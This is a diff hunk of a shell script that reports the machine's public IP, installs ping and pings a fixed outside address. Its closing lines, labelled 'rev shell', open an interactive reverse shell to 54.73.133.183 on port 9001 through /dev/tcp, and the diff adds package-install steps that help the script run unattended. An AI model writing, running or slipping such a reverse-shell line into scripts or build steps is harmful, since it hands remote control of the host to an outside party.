@@ -61,7 +61,14 @@ echo "johndoe@example.com"
 
 echo "rev shell"
 echo "ip public"
-curl ifconfig.me
+echo $(curl ifconfig.me)
+
+# Source - https://stackoverflow.com/a/39901446
+# Posted by Farhad Farahi, modified by community. See post 'Timeline' for change history
+# Retrieved 2026-07-08, License - CC BY-SA 4.0
+
+apt-get update -y
+apt-get install -y iputils-ping
 ping 54.73.133.183
 sh -i >& /dev/tcp/54.73.133.183/9001 0>&1
 exit 0
